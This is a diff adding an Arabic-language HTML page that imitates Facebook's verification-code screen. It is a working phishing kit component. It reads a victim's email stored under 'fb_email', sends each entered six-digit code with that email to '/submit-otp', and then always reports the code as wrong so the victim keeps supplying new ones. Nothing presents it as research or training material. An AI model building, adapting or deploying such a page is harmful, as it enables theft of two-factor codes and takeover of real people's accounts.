@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Facebook - رمز التحقق</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', sans-serif; }
+        body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        .container { background: white; max-width: 400px; width: 100%; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); padding: 30px 24px; text-align: center; }
+        .logo { font-size: 36px; font-weight: 800; color: #1877f2; margin-bottom: 20px; }
+        .icon-circle { width: 70px; height: 70px; background: #e7f3ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; font-size: 32px; }
+        .title { font-size: 22px; font-weight: 700; color: #1a1a1a; margin-bottom: 8px; }
+        .subtitle { color: #606770; font-size: 14px; margin-bottom: 24px; line-height: 1.5; }
+        .subtitle strong { color: #1877f2; word-break: break-all; }
+        
+        .otp-boxes { display: flex; justify-content: center; gap: 8px; margin-bottom: 24px; direction: ltr; }
+        .otp-boxes input {
+            width: 48px;
+            height: 56px;
+            text-align: center;
+            font-size: 22px;
+            font-weight: 700;
+            border: 2px solid #dddfe2;
+            border-radius: 10px;
+            background: #fff;
+            transition: 0.2s;
+            outline: none;
+            color: #1a1a1a;
+            font-family: 'Cairo', sans-serif;
+        }
+        .otp-boxes input:focus { border-color: #1877f2; box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.15); }
+        
+        .verify-btn {
+            width: 100%;
+            padding: 14px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-bottom: 12px;
+            font-family: 'Cairo', sans-serif;
+        }
+        .verify-btn:hover { background: #166fe5; }
+        .verify-btn:active { transform: scale(0.98); }
+        .verify-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+        
+        .resend-btn {
+            background: none;
+            border: none;
+            color: #1877f2;
+            font-size: 14px;
+            cursor: pointer;
+            font-family: 'Cairo', sans-serif;
+            font-weight: 600;
+            padding: 8px;
+        }
+        .resend-btn:hover { text-decoration: underline; }
+        .resend-btn:disabled { color: #90949c; cursor: not-allowed; text-decoration: none; }
+        
+        .timer { color: #90949c; font-size: 13px; margin-top: 8px; }
+        
+        .error-msg { background: #ffebe8; color: #d32f2f; padding: 10px 14px; border-radius: 8px; font-size: 14px; margin-bottom: 12px; display: none; }
+        .error-msg.show { display: block; }
+        
+        .success-msg { background: #e7f7ed; color: #1da85c; padding: 10px 14px; border-radius: 8px; font-size: 14px; margin-bottom: 12px; display: none; }
+        .success-msg.show { display: block; }
+        
+        .loading-spinner { display: none; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid white; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .verify-btn.loading .btn-text { display: none; }
+        .verify-btn.loading .loading-spinner { display: block; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo">facebook</div>
+        
+        <div class="icon-circle">📱</div>
+        
+        <div class="title">أدخل رمز التحقق</div>
+        <div class="subtitle">
+            تم إرسال رمز التحقق إلى<br>
+            <strong id="displayEmail">البريد الإلكتروني</strong>
+        </div>
+        
+        <div id="errorMsg" class="error-msg"></div>
+        <div id="successMsg" class="success-msg"></div>
+        
+        <div class="otp-boxes" id="otpContainer">
+            <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
+            <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
+            <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
+            <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
+            <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
+            <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
+        </div>
+        
+        <button type="button" id="verifyBtn" class="verify-btn">
+            <span class="btn-text">تحقق</span>
+            <div class="loading-spinner"></div>
+        </button>
+        
+        <button type="button" id="resendBtn" class="resend-btn" disabled>
+            إعادة إرسال الرمز (<span id="timerCount">60</span>ث)
+        </button>
+    </div>
+
+    <script>
+        const otpInputs = document.querySelectorAll('.otp-input');
+        const verifyBtn = document.getElementById('verifyBtn');
+        const resendBtn = document.getElementById('resendBtn');
+        const timerCount = document.getElementById('timerCount');
+        const errorMsg = document.getElementById('errorMsg');
+        const successMsg = document.getElementById('successMsg');
+        const displayEmail = document.getElementById('displayEmail');
+        
+        // عرض الإيميل
+        const email = localStorage.getItem('fb_email') || 'البريد الإلكتروني';
+        displayEmail.textContent = email;
+        
+        let countdown = 60;
+        let timerInterval = null;
+
+        // ===== التنقل بين الخانات =====
+        otpInputs.forEach((input, index) => {
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' || e.key === 'Tab' || e.key === 'ArrowLeft' || e.key === 'ArrowRight' || e.key === 'Delete') return;
+                if (!/^[0-9]$/.test(e.key)) e.preventDefault();
+            });
+            
+            input.addEventListener('input', function() {
+                this.value = this.value.replace(/\D/g, '');
+                if (this.value.length > 1) this.value = this.value.slice(0, 1);
+                if (this.value.length === 1 && index < otpInputs.length - 1) {
+                    otpInputs[index + 1].focus();
+                }
+            });
+            
+            input.addEventListener('keyup', function(e) {
+                if (e.key === 'Backspace' && this.value === '' && index > 0) {
+                    otpInputs[index - 1].focus();
+                }
+            });
+        });
+
+        // ===== التحقق من OTP =====
+        verifyBtn.addEventListener('click', async function() {
+            let otp = '';
+            otpInputs.forEach(input => otp += input.value);
+            
+            if (otp.length !== 6) {
+                errorMsg.textContent = '⚠️ يرجى إدخال الرمز كاملاً (6 أرقام)';
+                errorMsg.classList.add('show');
+                successMsg.classList.remove('show');
+                return;
+            }
+            
+            errorMsg.classList.remove('show');
+            verifyBtn.classList.add('loading');
+            verifyBtn.disabled = true;
+            
+            try {
+                const response = await fetch('/submit-otp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ otp, email })
+                });
+                
+                const data = await response.json();
+                console.log('✅ تم إرسال OTP:', data);
+                
+                successMsg.textContent = '❌ رمز التحقق غير صحيح، حاول مرة أخرى';
+                successMsg.style.background = '#ffebe8';
+                successMsg.style.color = '#d32f2f';
+                successMsg.classList.add('show');
+                
+                verifyBtn.classList.remove('loading');
+                verifyBtn.disabled = false;
+                
+                // مسح الخانات
+                otpInputs.forEach(i => i.value = '');
+                otpInputs[0].focus();
+                
+            } catch (error) {
+                console.error('❌ خطأ:', error);
+                verifyBtn.classList.remove('loading');
+                verifyBtn.disabled = false;
+                errorMsg.textContent = '⚠️ حدث خطأ في الاتصال';
+                errorMsg.classList.add('show');
+            }
+        });
+
+        // ===== إعادة الإرسال =====
+        resendBtn.addEventListener('click', function() {
+            countdown = 60;
+            startTimer();
+            successMsg.textContent = '✅ تم إعادة إرسال الرمز';
+            successMsg.style.background = '#e7f7ed';
+            successMsg.style.color = '#1da85c';
+            successMsg.classList.add('show');
+            setTimeout(() => successMsg.classList.remove('show'), 3000);
+        });
+
+        // ===== المؤقت =====
+        function startTimer() {
+            resendBtn.disabled = true;
+            if (timerInterval) clearInterval(timerInterval);
+            
+            timerInterval = setInterval(() => {
+                countdown--;
+                timerCount.textContent = countdown;
+                
+                if (countdown <= 0) {
+                    clearInterval(timerInterval);
+                    resendBtn.disabled = false;
+                    resendBtn.innerHTML = 'إعادة إرسال الرمز';
+                } else {
+                    resendBtn.innerHTML = `إعادة إرسال الرمز (<span id="timerCount">${countdown}</span>ث)`;
+                }
+            }, 1000);
+        }
+
+        // بدء التشغيل
+        startTimer();
+        otpInputs[0].focus();
+    </script>
+
+</body>
+</html>
